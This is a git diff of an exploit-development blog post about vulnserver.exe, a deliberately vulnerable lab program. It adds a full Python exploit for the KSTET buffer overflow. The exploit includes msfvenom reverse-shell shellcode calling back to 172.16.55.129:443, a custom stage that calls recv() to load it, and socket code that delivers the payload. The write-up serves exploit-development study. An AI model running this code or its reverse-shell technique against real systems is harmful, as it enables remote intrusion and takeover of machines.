@@ -911,10 +911,116 @@ Look at that! At memory address __`00C0F9F0`__, we have received our second stag
 
 The most interesting thing, however, is the fact we control EIP!
 
-Berfore stepping through one instruction:
+EIP before stepping through one instruction:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/034.png" alt="">
 
-After stepping through:
+EIP after stepping through:
 
-<img src="{{ site.url }}{{ site.baseurl }}/images/035.png" alt="">
+<img src="{{ site.url }}{{ site.baseurl }}/images/035.png" alt="">'
+
+Weaponizing the Proof of Concept
+---
+
+From here, all we have is a vanilla buffer overflow- where EIP is already pointed to our buffer. Let's get a shell.
+
+```python
+import os
+import sys
+import socket
+import time
+
+# Vulnerable command
+command = "KSTET "
+
+
+# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.55.129 LPORT=443 -f python -v shell
+# 324 bytes
+shell =  ""
+shell += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+shell += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+shell += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
+shell += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
+shell += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
+shell += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
+shell += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
+shell += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
+shell += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
+shell += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
+shell += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
+shell += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+shell += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
+shell += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
+shell += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xac\x10\x37\x81\x68"
+shell += "\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
+shell += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
+shell += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
+shell += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
+shell += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
+shell += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
+shell += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
+shell += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
+shell += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\x41" * 2
+
+# Creating file descriptor = 0x00000090
+crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
+
+# Move ESP out of the way
+crash += "\x83\xec\x50"			# sub esp, 0x50
+
+# Flags = 0x00000000
+crash += "\x31\xd2"
+crash += "\x52"				# push edx
+
+# BufSize = 0x00000200
+crash += "\x80\xc6\x02"			# add dh, 0x02
+crash += "\x52"				# push edx
+
+# Buffer = 0x00C0F9F0
+crash += "\x54"				# push esp
+crash += "\x5b"				# pop ebx
+crash += "\x83\xc3\x4c"			# add ebx, 0x4c
+crash += "\x53"				# push ebx
+
+# Push file descriptor onto the stack:
+crash += "\xff\x37"			# push dword ptr ds:[edi]
+
+# Calling W2_32.recv()
+crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
+crash += "\xc1\xe8\x08"                   # shr eax, 0x08
+crash += "\xff\xd0"                       # call eax
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+s.send(command+crash)
+
+time.sleep(5)
+
+s.send("\x90" * (512-324) + shell)
+s.close()
+```
+
+*In a muts like voice* "And we've got a shell. Nice.":
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/SHELLY.png" alt="">'
+
+Final Thoughts
+---
+I thought this was a pretty interesting techninque. So much can be done with shellcoding and exploit development by utilizing the Windows API, as you cannot make a directly syscall (like Linux). Obviously the file descriptor may be something to be concerned about, as it varies on operating systems. I have only ever seen a file descriptor that references a socket connection with either a value of __`80, 84, 88`__, or __`90__`.
+
+Any questions or things I could have done better- I am always open to constructive criticism.
+
+Peace, love, and positivity :-)
